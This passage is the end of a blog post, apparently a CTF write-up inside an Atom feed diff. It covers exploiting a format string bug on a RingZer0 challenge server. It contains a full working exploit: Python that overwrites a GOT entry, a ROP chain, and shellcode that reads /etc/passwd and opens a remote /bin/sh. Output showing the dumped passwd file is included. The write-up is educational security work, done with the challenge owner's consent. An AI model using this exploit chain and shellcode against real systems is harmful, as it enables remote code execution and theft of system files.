+# to use them in the format string vuln 
+# strlen
+write_on_stack(0x601b00, 0, format_offset)
+write_on_stack(0x601b01, 8, format_offset)
+write_on_stack(0x601b02, 16, format_offset)
+
+# need to write out the last three bytes of the STACK_PIVOT gadget over strlen's bytes
+writebytes = STACK_PIVOT &amp; 0xffffff 
+
+payload = ''
+lastbyte = 0
+
+# build format string to set three bytes at once
+for i in range(3):
+    if lastbyte &lt;= (writebytes &amp; 0xff):
+        byte_to_write = (writebytes &amp; 0xff) - lastbyte
+    else:   
+        byte_to_write = 256 + (writebytes &amp; 0xff) - lastbyte
+
+    payload += "%{}c".format(byte_to_write)
+    lastbyte = writebytes &amp; 0xff
+
+    writebytes &gt;&gt;= 8
+    payload += "%{}$hhn".format(format_offset+636+i)
+
+payload += "\n"
+
+print "[+] writing {} to strlen's GOT entry".format(hex(STACK_PIVOT &amp; 0xffffff))
+
+print "[+] format string payload: {}".format(payload)
+
+# connect and send the format string
+s = socket(AF_INET, SOCK_STREAM)
+s.connect(('pwn01.ringzer0team.com', 13377))
+s.recv(128)
+s.send(payload)
+s.recv(64)
+s.close()
+
+
+# now, strlen's GOT entry will point to the stack lifting gadget
+
+# let's prepare the ROP chain
+# here are the gadgets
+SYSCALL = libc_base + 0x0ad215
+POP_RAX = libc_base + 0x041dc8
+POP_RSI = libc_base + 0x021535
+POP_RDI = libc_base + 0x02028b
+POP_RDX = libc_base + 0x0a834b
+
+ropchain = ''
+# mprotect 0x400000 to rwx, so we can write AND execute from it
+ropchain += p(POP_RAX+1) * 8       # points to ret; effectively, a NOP!
+ropchain += p(POP_RAX)
+ropchain += p(10)                  # syscall mprotect
+ropchain += p(POP_RDI)
+ropchain += p(0x400000)            # start of buffer to mprotect
+ropchain += p(POP_RSI)
+ropchain += p(0x1000)              # length of buffer
+ropchain += p(POP_RDX)
+ropchain += p(7)                   # flags; rwx
+ropchain += p(SYSCALL)             # after executing this syscall, 0x400000 should be rwx
+
+# we need to fetch the socket from memory
+ropchain += p(libc_base + 0x2028a) # pop r15; ret
+ropchain += p(-0x48)               #
+ropchain += p(libc_base + 0x6933f) # lea rax, [rbp + r15]; set rax to address that contains socket descriptor
+ropchain += p(31337)*5             # junk for all the pop r64's
+ropchain += p(libc_base + 0xeb938) # mov rax, [rax]; grabs value of socket descriptor
+ropchain += p(libc_base + 0x2c10e) # xchg eax, edi; edi now contains the socket descriptor
+
+# read in the shellcode from the socket (sockfd in rdi already)
+ropchain += p(POP_RAX)
+ropchain += p(0)                   # syscall read
+ropchain += p(POP_RSI)
+ropchain += p(0x400000)            # start of buffer
+ropchain += p(POP_RDX)
+ropchain += p(0x1000)              # size of buffer
+ropchain += p(SYSCALL)             # after this syscall, the shellcode should be at 0x400000
+ropchain += p(0x400000)            # so return to it!
+
+# rdi still contains socket fd!
+s = socket(AF_INET, SOCK_STREAM)
+s.connect(('pwn01.ringzer0team.com', 13377))
+
+print s.recv(128)
+# send our ropchain
+s.send(ropchain)
+
+time.sleep(0.1)
+# modified read /etc/passwd, original by Mr.Un1k0d3r
+s.send("\x49\x87\xff\xeb\x3e\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x90\x90\x90\x49\x87\xff\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbd\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41")
+
+# handle the incoming connection; in this case, grab the contents of /etc/passwd
+import telnetlib
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
+</code></pre>
+
+<p>And the output!</p>
+
+<pre><code class="bash">parameter 5 points to:  0x7fffb6657fc8
+address pointed to by parameter 5 contains:  0x7fffb6658f51
+scratch contains:  0x72632f656d6f682f
+scratch is parameter 1123
+[+] strlen is at 0x7f7af6e72c40.
+[+] libc_base is at 0x7f7af6df2000.
+[+] stack pivot gadget is at 0x7f7af6e74cfe.
+[+] wrote 0x601b00 to 1123
+[+] wrote 0x601b01 to 1124
+[+] wrote 0x601b02 to 1125
+[+] writing 0xe74cfe to strlen's GOT entry
+[+] format string payload: %254c%1123$hhn%78c%1124$hhn%155c%1125$hhn
+
+HF Remote Secure Shell [1.3.37]
+
+Password:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+Debian-exim:x:101:103::/var/spool/exim4:/bin/false
+statd:x:102:65534::/var/lib/nfs:/bin/false
+sshuser:x:1000:1000:sshuser,,,:/home/sshuser:/bin/bash
+mysql:x:103:106:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+crackme:x:1001:1001::/home/crackme:/bin/sh
+*** Connection closed by remote host ***
+</code></pre>
+
+<p>Cool, we have arbitrary code execution on the remote box! But remember, the goal was to get a shell&hellip;</p>
+
+<h2>Shell&rsquo;s up</h2>
+
+<p>The actual shellcode that landed me a shell uses <code>dup2</code> to duplicate stdin from the socket. This will allow us to communicate with the spawned shell. The assembly is quite straightforward. Not optimized, not pretty:</p>
+
+<pre><code>bits 64
+
+push rdi
+push rdi
+push 33         ; dup2
+pop rax         ; set rax to dup2
+                ; rdi still contains the socket fd
+xor esi, esi    ; stdin
+syscall
+pop rdi
+inc rsi         ; stdout
+syscall
+pop rdi
+inc rsi         ; stderr
+syscall
+
+jmp _there
+_here:
+pop rdi         ; points to /bin/sh
+xor esi, esi    ; argv = NULL
+xor edx, edx    ; argp = NULL
+push 59         ; execve
+pop rax
+syscall
+
+push 60         ; exit
+pop rax
+syscall
+
+_there:
+call _here
+db "/bin/sh", 0
+</code></pre>
+
+<p>After sticking that shellcode in the exploit, I got a shell!</p>
+
+<pre><code class="python">s.send("\x57\x57\x6a\x21\x58\x31\xf6\x0f\x05\x5f\x48\xff\xc6\x0f\x05\x5f\x48\xff\xc6\x0f\x05\xeb\x0f\x5f\x31\xf6\x31\xd2\x6a\x3b\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xec\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00")
+</code></pre>
+
+<p><img src="/assets/maximum-overkill-two/01-interactive-shell-on-remote-box.png" alt="" /></p>
+
+<p>You can see that the <code>dup2</code> shellcode is not completely effective; I needed to redirect stdout to stdin to get command output so somehow <code>dup2</code> does not duplicate stdout correctly. But hey, the objective is met! An interactive shell on an otherwise inaccessible server!</p>
+
+<h2>Wrapping up</h2>
+
+<p>This was a story of how a single format string vulnerability was beaten into arbitrary code execution. The exploit bypasses ASLR and NX via ROP, and finally sends over shellcode which will be executed. The CTF challenge was not designed with this in mind, but it was a fun exercise (and a potential warmup for Boston Key Party) nonetheless! My thanks go out to Mr.Un1k0d3r for being cool with me trying to break his challenge and even giving me the binary :)</p>
+
+<p>Until the next #maximumoverkill :]</p>
+]]></content>
+  </entry>
+  
+</feed>
